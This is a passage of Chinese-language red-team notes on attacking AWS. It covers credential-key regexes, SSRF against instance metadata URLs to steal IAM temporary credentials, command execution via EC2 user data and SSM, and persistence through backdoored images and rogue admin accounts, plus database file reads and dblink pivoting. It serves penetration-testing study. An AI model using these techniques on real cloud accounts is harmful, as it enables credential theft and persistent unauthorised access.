+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;Condition&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;StringEquals&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;s3:x-amz-grant-full-control&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;id=AccountA-CanonicalUserID&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>使用 <code>s3:x-amz-grant-full-control</code> 条件键指定了条件，要求此请求包含 <code>x-amz-full-control</code> 标头。</p>
+<p>也可以限制ua之类的，没有满足条件的请求会access deny掉</p>
+<p><a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/amazon-s3-policy-keys.html">https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/amazon-s3-policy-keys.html</a></p>
+<h1 id="ec2遇到的洞云虚拟机">EC2遇到的洞（云虚拟机</h1>
+<h3 id="凭证泄露"><strong>凭证泄露</strong></h3>
+<p>云场景下的凭证泄露可以分成以下几种：</p>
+<ul>
+<li>控制台账号密码泄露，例如登录控制台的账号密码</li>
+<li>临时凭证泄露</li>
+<li>访问密钥泄露，即 AccessKeyId、SecretAccessKey 泄露</li>
+<li>实例登录凭证泄露，例如 AWS 在创建 EC2 生成的证书文件遭到泄露</li>
+</ul>
+<p>对于这类凭证信息的收集，一般可以通过以下几种方法进行收集：</p>
+<ul>
+<li>Github 敏感信息搜索</li>
+<li>反编译目标 APK、小程序 的配置文件</li>
+<li>目标网站源代码泄露</li>
+<li>低权限的WEBSHELL查看网站的配置文件</li>
+</ul>
+<p>可以使用正则搜索，这里列举些常见厂商AK,SK命名对应的正则。</p>
+<pre tabindex="0"><code>Amazon Web Services
+^AKIA[A-Za-z0-9]{16}$
+
+Google Cloud Platform
+^GOOG[\w\W]{10,30}$
+
+Microsoft Azure
+^AZ[A-Za-z0-9]{34,40}$
+
+IBM Cloud
+^IBM[A-Za-z0-9]{10,40}$
+
+Oracle Cloud
+^OCID[A-Za-z0-9]{10,40}$
+
+阿里云
+^LTAI[A-Za-z0-9]{12,20}$
+
+腾讯云
+^AKID[A-Za-z0-9]{13,20}$
+
+华为云
+^AK[\w\W]{10,62}$
+
+百度云
+^AK[A-Za-z0-9]{10,40}$
+
+京东云
+^AK[A-Za-z0-9]{10,40}$
+</code></pre><h3 id="元数据查询">元数据查询</h3>
+<h3 id="条件">条件</h3>
+<p>要有ssrf漏洞可以读，还有配置了iam定义的角色人物</p>
+<h3 id="原理">原理</h3>
+<p>元数据即表示实例的相关数据，可以用来配置或管理正在运行的实例。用户可以通过元数据服务在运行中的实例内查看实例的元数据。当实例向元数据服务发起请求时，该请求不会通过网络传输（内网，如果获得了目标 EC2 权限或者目标 EC2 存在 SSRF 漏洞，就可以获得到实例的元数据。</p>
+<p>在云场景下可以通过元数据进行临时凭证和其他信息的收集，在 AWS 下的元数据地址为：<code>http://169.254.169.254/latest/meta-data</code> 或者 <code>http://instance-data/latest/meta-data</code>，直接 curl 请求该地址即可。</p>
+<p>169.254.169.254属于链路本地地址（Link-localaddress），链路本地地址又称连结本地位址，是计算机网络中一类特殊的地址，它仅供于在网段，或广播域中的主机相互通信使用。这类主机通常不需要外部互联网服务，仅有主机间相互通讯的需求。IPv4链路本地地址定义在169.254.0.0/16地址块。</p>
+<p>脆弱原因：</p>
+<p>由于元数据服务部署在链路本地地址上，云厂商并没有进一步设置安全措施来检测或阻止由实例内部发出的恶意的对元数据服务的未授权访问。攻击者可以通过实例上应用的SSRF漏洞对实例的元数据服务进行访问。</p>
+<p>因此，如果实例中应用中存在SSRF漏洞，那么元数据服务将会完全暴露在攻击者面前。</p>
+<p>在实例元数据服务提供的众多数据中，有一项数据特别受到攻击者的青睐，那就是角色的临时访问凭据。这将是攻击者由SSRF漏洞到获取实例控制权限的桥梁。</p>
+<p>简单来说，元数据的 <code>/iam/security-credentials/&lt;rolename&gt;</code> 路径有ak，sk，还有临时登录的token ，元数据url在<code>http://169.254.169.254/latest/meta-data</code> 或者 <code>http://instance-data/latest/meta-data</code>，且没什么保护，容易被ssrf跳转到内网的地址，然后给读了</p>
+<p>通过元数据获得目标的临时凭证后，就可以接管目标账号权限了，这里介绍一些对于 RT 而言价值相对较高的元数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>mac    实例 MAC 地址
+</span></span><span style="display:flex;"><span>hostname    实例主机名
+</span></span><span style="display:flex;"><span>iam<span style="color:#ff79c6">/</span>info    获取角色名称
+</span></span><span style="display:flex;"><span>local<span style="color:#ff79c6">-</span>ipv4    实例本地 IP
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">public</span><span style="color:#ff79c6">-</span>ipv4    实例公网 IP
+</span></span><span style="display:flex;"><span>instance<span style="color:#ff79c6">-</span>id    实例 ID
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">public</span><span style="color:#ff79c6">-</span>hostname    接口的公有 DNS (IPv4)
+</span></span><span style="display:flex;"><span>placement<span style="color:#ff79c6">/</span>region    实例的 AWS 区域
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">public</span><span style="color:#ff79c6">-</span>keys<span style="color:#ff79c6">/</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">/</span>openssh<span style="color:#ff79c6">-</span>key    公有密钥
+</span></span><span style="display:flex;"><span>/iam/security-credentials/&lt;rolename&gt;    获取角色的临时凭证
+</span></span></code></pre></div><h3 id="ssrf攻击点">ssrf攻击点</h3>
+<p>这里提一嘴，元数据看到很多东西没啥用，主要是找角色</p>
+<p>ram/子用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>可以 ssrf 的常见元数据点
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>packet
+</span></span><span style="display:flex;"><span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.packet.net/userdata
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>google
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.google.internal/computeMetadata/v1beta1/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//169.254.169.254/computeMetadata/v1/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.google.internal/computeMetadata/v1/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata/computeMetadata/v1/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.google.internal/computeMetadata/v1/instance/hostname
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.google.internal/computeMetadata/v1/instance/id
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.google.internal/computeMetadata/v1/project/project-id
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>orcale
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//192.0.0.192/latest/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//192.0.0.192/latest/user-data/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//192.0.0.192/latest/meta-data/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//192.0.0.192/latest/attributes/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>alibaba
+</span></span><span style="display:flex;"><span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//100.100.100.200/latest/meta-data/
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//100.100.100.200/latest/meta-data/instance-id
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//100.100.100.200/latest/meta-data/image-id
+</span></span></span></code></pre></div><h3 id="元数据攻击实例">元数据攻击实例</h3>
+<p><a href="https://paper.seebug.org/1681/">https://paper.seebug.org/1681/</a></p>
+<p>目标有ssrf漏洞，先查看<a href="http://169.254.169.254/latest/meta-data/iam/info">http://169.254.169.254/latest/meta-data/iam/info</a>里的角色名称（rolename）</p>
+<p>在获取到角色名称后，攻击者可以继续通过SSRF漏洞获取角色的临时凭证：</p>
+<p><a href="http://x.x.x.x/url=http://169.254.169.254/latest/metadata/iam/security-credentials/">http://x.x.x.x/url=http://169.254.169.254/latest/metadata/iam/security-credentials/</a>+rolename</p>
+<p>获取角色临时凭据的案例可参见下图:</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2013.png" alt="Untitled">
+
+</p>
+<p>然后就是看角色绑定的策略了，以及读数据，权限维持，这个等有实例的时候细说</p>
+<h2 id="账号劫持">账号劫持</h2>
+<p>如果云厂商的控制台存在漏洞的话，用户账号也会存在一定的风险。</p>
+<p>例如 AWS 的控制台曾经出现过一些 XSS 漏洞，攻击者就可能会使用这些 XSS 漏洞进行账号劫持，从而获得目标云服务器实例的权限。</p>
+<h3 id="恶意的镜像"><strong>恶意的镜像</strong></h3>
+<p>AWS 在创建实例的时候，用户可以选择使用公共镜像或者自定义镜像，如果这些镜像中有恶意的镜像，那么目标使用该镜像创建实例就会产生风险。</p>
+<p>以 CVE-2018-15869 为例，关于该漏洞的解释是：当人们通过 AWS 命令行使用「ec2 describe-images」功能时如果没有指定 &ndash;owners 参数，可能会在无意中加载恶意的 Amazon 系统镜像 ( AMI），导致 EC2 被用来挖矿。</p>
+<p>对此，在使用 AWS 命令行时应该确保自己使用的是不是最新版的 AWS 命令行，同时确保从可信的来源去获取 Amazon 系统镜像。</p>
+<h2 id="使用用户数据执行命令"><strong>使用用户数据执行命令</strong></h2>
+<h3 id="条件-1">条件</h3>
+<p>有ak，sk，或者有直接的控制台用户账号密码</p>
+<h3 id="利用">利用</h3>
+<p>执行用户数据里的命令，来做一个反弹shell</p>
+<h3 id="描述">描述</h3>
+<p>在创建云服务器时，用户可以通过指定自定义数据，进行配置实例，当云服务器启动时，自定义数据将以文本的方式传递到云服务器中，并执行该文本，而且文本里的命令默认以 root 权限执行。</p>
+<p>通过这一功能，攻击者可以修改实例的用户数据并向其中写入待执行的命令，这些代码将会在实例每次启动时自动执行</p>
+<h3 id="控制台"><strong>控制台</strong></h3>
+<p>在控制台界面可以直接编辑实例的用户数据。</p>
+<p>在 AWS 下，修改用户数据需要停止实例，在 AWS 下停止实例会擦除实例存储卷上的所有数据，如果没设置弹性 IP，实例的公有 IP 也会变化，因此停止实例需谨慎。</p>
+<p>修改用户数据的位置在：操作-&gt; 实例设置-&gt;编辑用户数据</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2014.png" alt="Untitled">
+
+</p>
+<p>这里以执行 touch 命令为例，如果用户数据设置为以下内容，那么实例只有才第一次启动才会运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/bashtouch /tmp/teamssix.txt
+</span></span></span></code></pre></div><p>如果用户数据设置为以下内容，那么实例只要重启就会运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>Content<span style="color:#ff79c6">-</span>Type<span style="color:#ff79c6">:</span> multipart<span style="color:#ff79c6">/</span>mixed; boundary<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;//&#34;</span>
+</span></span><span style="display:flex;"><span>MIME<span style="color:#ff79c6">-</span>Version<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1.0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">--</span><span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Content<span style="color:#ff79c6">-</span>Type<span style="color:#ff79c6">:</span> text<span style="color:#ff79c6">/</span>cloud<span style="color:#ff79c6">-</span>config; charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;us-ascii&#34;</span>
+</span></span><span style="display:flex;"><span>MIME<span style="color:#ff79c6">-</span>Version<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1.0</span>
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff79c6">-</span>Transfer<span style="color:#ff79c6">-</span>Encoding<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">7</span>bit
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff79c6">-</span>Disposition<span style="color:#ff79c6">:</span> attachment; filename<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;cloud-config.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>#cloud<span style="color:#ff79c6">-</span>config
+</span></span><span style="display:flex;"><span>cloud_final_modules<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span> [scripts<span style="color:#ff79c6">-</span>user, always]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">--</span><span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Content<span style="color:#ff79c6">-</span>Type<span style="color:#ff79c6">:</span> text<span style="color:#ff79c6">/</span>x<span style="color:#ff79c6">-</span>shellscript; charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;us-ascii&#34;</span>
+</span></span><span style="display:flex;"><span>MIME<span style="color:#ff79c6">-</span>Version<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1.0</span>
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff79c6">-</span>Transfer<span style="color:#ff79c6">-</span>Encoding<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">7</span>bit
+</span></span><span style="display:flex;"><span>Content<span style="color:#ff79c6">-</span>Disposition<span style="color:#ff79c6">:</span> attachment; filename<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;userdata.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>#<span style="color:#ff79c6">!</span>/bin/bash
+</span></span><span style="display:flex;"><span>touch <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>teamssix.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">--</span><span style="color:#6272a4">//--
+</span></span></span></code></pre></div><p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2015.png" alt="Untitled">
+
+</p>
+<h3 id="命令行"><strong>命令行</strong></h3>
+<p>除了在控制台上操作的方式外，也可以使用 aws cli 操作</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws ec2 run-instances --image-id ami-abcd1234 --count <span style="color:#bd93f9">1</span> --instance-type m3.medium <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>--key-name my-key-pair --subnet-id subnet-abcd1234 --security-group-ids sg-abcd1234 <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>--user-data file://my_script.txt
+</span></span></code></pre></div><p><code>my_script.txt</code>就是要执行的脚本</p>
+<p>查看实例用户数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws ec2 describe<span style="color:#ff79c6">-</span>instance<span style="color:#ff79c6">-</span>attribute <span style="color:#ff79c6">--</span>instance<span style="color:#ff79c6">-</span>id i<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1234567890</span>abcdef0 <span style="color:#ff79c6">--</span>attribute userData <span style="color:#ff79c6">--</span>output text <span style="color:#ff79c6">--</span>query <span style="color:#f1fa8c">&#34;UserData.Value&#34;</span> <span style="color:#ff79c6">|</span> base64 <span style="color:#ff79c6">--</span>decode
+</span></span></code></pre></div><h2 id="ec2-下的权限维持"><strong>EC2 下的权限维持</strong></h2>
+<p><strong>1、用户数据</strong></p>
+<p>用户数据改成反弹shell即可，但是需要每次重启实例，但是云虚拟机一般不会重启，所以没啥用</p>
+<p><strong>2、后门镜像</strong></p>
+<p>当攻击者获取到控制台权限后，可以看看目标的 AMI（Amazon 系统镜像），如果可以对其进行修改或者删除、创建的话，RT 就可以将原来的镜像替换成存在后门的镜像。</p>
+<p>这样当下次目标用户在选用该镜像创建实例的时候，就会触发我们在镜像中植入的恶意代码了</p>
+<p><strong>3、创建访问密钥</strong></p>
+<p>如果当前环境可以创建新的访问密钥（控制台权限），则可以在 IAM 中创建访问密钥（ak）进行权限维持。</p>
+<p><strong>4、创建辅助账号</strong></p>
+<p>除了以上的权限维持方法，还可以通过在 IAM 中创建高权限子账号的方式进行权限维持，然后通过这个子账号进行后续的持续攻击行为。</p>
+<p><strong>5、其他的权限维持方法（老牌linux权限维持）</strong></p>
+<p>除了上述方法外，还可以通过在实例中添加隐藏用户、安装远控软件等等传统方法进行权限维</p>
+<h2 id="获取共享快照内的数据"><strong>获取共享快照内的数据</strong></h2>
+<h3 id="条件-2">条件</h3>
+<p>当前凭证：EC2:CreateSnapshot</p>
+<h3 id="利用-1">利用</h3>
+<p>拿下aws控制台无法打开实例的时候，可以打个快照，自己创建一个实例，然后看快照里面的内容</p>
+<h2 id="ec2-子域名接管"><strong>EC2 子域名接管</strong></h2>
+<h3 id="弹性ip">弹性ip</h3>
+<p>弹性 IP 地址会分配给您的 AWS 账户，并且在您释放它之前一直属于您。</p>
+<p>普通公网ip，ec2释放的时候就释放了，弹性ip就算实例释放了还是属于你。使用弹性 IP 地址，您可以快速将地址重新映射到您的账户中的另一个实例</p>
+<h3 id="条件-3">条件</h3>
+<p>AWS EC2 没有配置弹性 IP</p>
+<p>CNAME 配置了该公有 IPv4 DNS 地址或者 A 记录配置了公有 IPv4 IP 地址</p>
+<p>实例得重启（鸡肋</p>
+<h3 id="利用-2">利用</h3>
+<p><a href="https://www.notion.so">https://www.notion.so</a></p>
+<p>比较有意思的是在一个公司的域名渗透测试，挖掘子域名的时候明明是该公司的子域名确挖到别人的资产上的洞了</p>
+<h2 id="利用-aws-cli-执行命令"><strong>利用 AWS CLI 执行命令</strong></h2>
+<h3 id="条件-4">条件</h3>
+<p>当目标实例被 AWS Systems Manager 代理后，除了在控制台可以执行命令外，拿到凭证后使用 AWS 命令行也可以在 EC2 上执行命令。</p>
+<p>相当于aws configure能登录</p>
+<h3 id="利用-3">利用</h3>
+<p>列出目标实例 ID(下面执行命令需要指定实例</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws ec2 describe<span style="color:#ff79c6">-</span>instances <span style="color:#ff79c6">--</span>filters <span style="color:#f1fa8c">&#34;Name=instance-type,Values=t2.micro&#34;</span> <span style="color:#ff79c6">--</span>query <span style="color:#f1fa8c">&#34;Reservations[].Instances[].InstanceId&#34;</span>
+</span></span></code></pre></div><p>在对应的实例上执行命令，注意将 instance-ID 改成自己实例的 ID,执行完会生成该命令结果的command id</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws ssm send<span style="color:#ff79c6">-</span>command <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>instance<span style="color:#ff79c6">-</span>ids <span style="color:#f1fa8c">&#34;instance-ID&#34;</span> <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span><span style="color:#8be9fd;font-style:italic">document</span><span style="color:#ff79c6">-</span>name <span style="color:#f1fa8c">&#34;AWS-RunShellScript&#34;</span> <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>parameters commands<span style="color:#ff79c6">=</span>ifconfig <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>output text
+</span></span></code></pre></div><p>获得执行命令的结果，注意将 $sh-command-id 改成自己的 Command ID</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws ssm list<span style="color:#ff79c6">-</span>command<span style="color:#ff79c6">-</span>invocations <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>command<span style="color:#ff79c6">-</span>id $sh<span style="color:#ff79c6">-</span>command<span style="color:#ff79c6">-</span>id <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>details
+</span></span></code></pre></div><p>具体可以看wiki的截图，打码处是重点</p>
+<p><a href="https://www.notion.so">https://www.notion.so</a></p>
+<h1 id="rds信息收集">RDS<strong>信息收集</strong></h1>
+<h2 id="通知邮箱"><strong>通知邮箱</strong></h2>
+<p>在 AWS RDS 的控制台处，可以在编辑警报处看到目标配置的通知邮箱地址，这种邮箱地址可能是目标公司的安全部门人员邮箱，应该予以关注。</p>
+<h2 id="性能详情"><strong>性能详情</strong></h2>
+<p>在 AWS RDS 控制台中，可以通过数据库性能详情信息，收集到目标 RDS TOP SQL 语句、TOP 连接主机、TOP 用户等信息。</p>
+<h2 id="共享快照"><strong>共享快照</strong></h2>
+<p>对于 AWS RDS，可以在共享快照中，根据快照名称判断查找，看看是否有和目标相关联的快照，然后再通过还原快照的方式，获得快照中 RDS 的数据。</p>
+<h2 id="mssql读信息">MSSQL读信息</h2>
+<p>bulk insert 导入平面文件到数据库</p>
+<p>用法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>bulk insert test
+</span></span><span style="display:flex;"><span>from <span style="color:#f1fa8c">&#39;f:\test.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">with</span>
+</span></span><span style="display:flex;"><span>(fieldterminator<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;,&#39;</span>,
+</span></span><span style="display:flex;"><span>rowterminator<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;\n&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">--</span> 创建表 #testtable，并指定一个 ntext 类型的列 context
+</span></span><span style="display:flex;"><span>create table #testtable(context ntext);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">--</span> 使用 BULK INSERT 语句将数据从 <span style="color:#f1fa8c">&#39;C:\ProgramData\Amazon\EC2Launch\log\agent.log&#39;</span> 文件加载到 #testtable 表中
+</span></span><span style="display:flex;"><span>BULK INSERT #testtable FROM <span style="color:#f1fa8c">&#39;C:\ProgramData\Amazon\EC2Launch\log\agent.log&#39;</span>
+</span></span><span style="display:flex;"><span>WITH (DATAFILETYPE <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;char&#39;</span>,KEEPNULLS)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">--</span> 从 #testtable 表中选择所有的内容
+</span></span><span style="display:flex;"><span>select <span style="color:#ff79c6">*</span> from #testtable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">--</span> 删除 #testtable 表
+</span></span><span style="display:flex;"><span>drop table #testtable;
+</span></span></code></pre></div><h2 id="postgresql-数据库-ssrf"><strong>PostgreSQL 数据库 SSRF</strong></h2>
+<h3 id="条件-5">条件</h3>
+<p>控制一台pgsql数据库权限，知道另一台pgsql ip和信息，但是无法直接登录，这个时候就可以用dblink进行两台数据库连接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff79c6">create</span> extension dblink;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">select</span> dblink_connect(<span style="color:#f1fa8c">&#39;test&#39;</span>,<span style="color:#f1fa8c">&#39;host=x.x.x.x port=xxx user=xxx password=xxx dbname=postgres sslmode=disable&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">create</span> <span style="color:#ff79c6">table</span> t(id <span style="color:#8be9fd;font-style:italic">int</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">select</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> dblink_send_query(<span style="color:#f1fa8c">&#39;test&#39;</span>, <span style="color:#f1fa8c">&#39;select version();&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">select</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> dblink_get_result(<span style="color:#f1fa8c">&#39;test&#39;</span>) <span style="color:#ff79c6">as</span> t(res <span style="color:#8be9fd;font-style:italic">text</span>);
+</span></span></code></pre></div><h1 id="iam遇到的洞">IAM遇到的洞</h1>
+<p>iam是云控制台上的一套身份管理服务</p>
+<h2 id="云控制台上的一套身份管理服务">云控制台上的一套身份管理服务</h2>
+<p>如果当前用户具备编辑 IAM 策略的权限，但没有某些服务权限的话，那么可以在 IAM 中开启这个服务权限，以实现提权。</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2016.png" alt="Untitled">
+
+</p>
+<h2 id="利用-iam-进行权限维持"><strong>利用 IAM 进行权限维持</strong></h2>
+<p>利用 IAM 进行权限维持的原理也比较简单，直接在 IAM 中创建一个拥有高权限的用户即可。</p>
+<p>例如这里选择添加用户，访问类型选择控制台密码</p>
+<p>设置权限」选择「直接附加现有策略」，策略选择「AdministratorAccess」，即表示附加所有策略</p>
+<p>
+  <img src="%E4%BA%91%E6%9C%8D%E5%8A%A1%202bc370f4b05641a7baade919fdeb6e13/Untitled%2017.png" alt="Untitled">
+
+</p>
+<h2 id="在-aws-下查看自己所拥有的权限"><strong>在 AWS 下查看自己所拥有的权限</strong></h2>
+<p>aws登录后看自己的 权限命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws iam get<span style="color:#ff79c6">-</span>user
+</span></span></code></pre></div><p>root用户结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> aws iam get<span style="color:#ff79c6">-</span>user
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;User&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;UserId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;0123456789&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Arn&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:iam::0123456789:root&#34;</span>,
